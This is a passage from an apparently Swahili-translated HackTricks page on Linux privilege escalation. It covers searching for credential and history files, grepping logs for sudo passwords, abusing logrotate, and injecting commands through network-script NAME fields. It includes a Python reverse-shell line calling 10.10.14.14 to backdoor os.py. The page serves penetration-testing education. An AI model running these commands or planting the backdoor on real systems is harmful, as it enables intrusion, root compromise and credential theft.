find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries ndani ya PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zinazoweza kuwa na nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), hutafuta **faili kadhaa zinazoweza kuwa na nywila**.\
**Chombo kingine kinachovutia** ambacho unaweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu ya chanzo huria inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Iwapo unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yake**. Kadri log inavyokuwa ya ajabu, ndivyo itakavyokuwa ya kuvutia (labda).\
Pia, baadhi ya **"bad"** configured (backdoored?) **audit logs** zinaweza kukuwezesha **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hiki: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs kundi** [**adm**](interesting-groups-linux-pe/index.html#adm-group) itasaidia sana.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Pia unapaswa kuangalia faili zinazojumuisha neno "**password**" katika **jina** lao au ndani ya **maudhui**, na pia angalia IPs na emails ndani ya logs, au hashes regexps.\ Sitaorodhesha hapa jinsi ya kufanya yote haya lakini ikiwa unavutiwa unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **kutoka wapi** script ya python itaendeshwa na unaweza **kuandika ndani** ya folder hiyo au unaweza **kuhariri python libraries**, unaweza kurekebisha maktaba ya OS na backdoor it (ikiwa unaweza kuandika mahali script ya python itaendeshwa, nakili na bandika maktaba ya os.py).

Ili **backdoor the library** ongeza tu mwishoni mwa maktaba ya os.py mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Kutumia udhaifu wa logrotate

Udhaifu kwenye `logrotate` unaoruhusu watumiaji wenye **uruhusa wa kuandika** kwenye faili la logi au kwenye saraka za mzazi wake kupata kwa uwezekano vibali vilivyopandishwa. Hii ni kwa sababu `logrotate`, mara nyingi ikirushwa kama **root**, inaweza kutumika kuendesha faili za hiari, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa sio tu katika _/var/log_ bali pia katika saraka yoyote ambapo rotation ya logi inafanywa.

> [!TIP]
> Udhaifu huu unaathiri toleo la `logrotate` `3.18.0` na ya zamani

Maelezo zaidi kuhusu udhaifu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kuchukua faida ya udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu unafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hivyo kila unapogundua kuwa unaweza kubadilisha logi, angalia nani anayesimamia zile logi na angalia kama unaweza kupandisha vibali kwa kubadilisha logi na symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Marejeo ya udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** ile iliyopo, basi **system is pwned**.

Script za mtandao, _ifcg-eth0_ kwa mfano, zinatumika kwa miunganisho ya mtandao. Zinaonekana kabisa kama faili za .INI. Hata hivyo, zinakuwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, sifa ya `NAME=` katika script hizi za mtandao haishughulikiwi vizuri. **Ikiwa kuna nafasi tupu katika jina, mfumo hujaribu kuendesha sehemu inayofuata baada ya nafasi hiyo**. Hii inamaanisha kwamba **kila kitu baada ya nafasi ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

Kabrari `/etc/init.d` ni makazi ya **skripti** za System V init (SysVinit), mfumo wa **kusimamia huduma za Linux wa jadi**. Inajumuisha skripti za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zilizopo katika `/etc/rc?.d/`. Njia mbadala kwenye mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya wa **kusimamia huduma** ulioanzishwa na Ubuntu, ukitumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya mabadiliko kwenda Upstart, skripti za SysVinit bado zinatumiwa sambamba na usanidi wa Upstart kutokana na safu ya ulinganifu ndani ya Upstart.

**systemd** imeibuka kama mtekelezaji wa kisasa wa initialization na meneja wa huduma, ikitoa vipengele vya juu kama kuanzisha daemon kulingana na mahitaji, usimamizi wa automount, na snapshots za hali ya mfumo. Inapanga mafaili ndani ya `/usr/lib/systemd/` kwa packages za distribution na `/etc/systemd/system/` kwa marekebisho ya msimamizi, kurahisisha mchakato wa usimamizi wa mfumo.

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kutoroka kutoka kwa Shells zilizo zuiwa


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Jifunze zaidi na maelezo ya exploitation hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kinga za Usalama za Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana za Linux/Unix Privesc

### **Zana bora ya kutafuta Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Orodhesha kernel vulns kwenye Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (ufikiaji wa kimwili):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Mkusanyo wa skripti zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeo

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
